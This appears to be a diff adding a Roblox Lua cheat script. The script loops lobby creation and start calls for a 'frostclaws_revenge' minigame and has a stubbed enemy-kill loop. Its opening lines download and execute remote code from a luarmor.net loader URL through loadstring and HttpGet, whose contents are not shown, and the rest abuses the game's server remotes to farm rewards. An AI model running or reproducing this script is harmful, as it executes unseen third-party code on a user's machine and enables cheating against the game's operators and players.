@@ -1,0 +1,51 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e4315db490a84e920190f83279c4732e.lua"))()
+end)
+
+spawn(function()
+    task.wait(30)
+    while wait(1) do       
+        local args = {
+            [1] = "frostclaws_revenge"
+        }       
+        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("MinigameAPI/LobbyCreate"):InvokeServer(unpack(args))
+        task.wait(1)    
+        local args = {
+            [1] = {
+                ["startup_settings"] = {}
+            }
+        }        
+        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("MinigameAPI/LobbyStart"):FireServer(unpack(args))
+
+        repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.MinigameInGameApp.Enabled == true
+
+        local Event = workspace.Interiors:GetChildren()
+        for num, i in Event do
+            if string.find(i.Name, 'FrostclawsRevengeInterior') then
+                local originalString = i.Name
+                _G.WinterEventFindName = string.gsub(originalString, "FrostclawsRevengeInterior::", "")
+                print(_G.WinterEventFindName)
+                _G.EventName = i.Name
+            else
+                break
+            end
+        end
+        local RewardGUI = game:GetService("Players").LocalPlayer.PlayerGui.MinigameRewardsApp.Body
+        while wait() do
+            if RewardGUI.Visible == true then
+                break
+            else
+                local Enemys = workspace.Interiors[_G.EventName].LocalEnemies:GetChildren()
+                for num2, i2 in Enemys do
+                    if RewardGUI.Visible == true then
+                        break
+                    else
+                        pcall(function ()
+                            print('kill')
+                        end)
+                    end
+                end
+            end
+        end
+    end
+end)
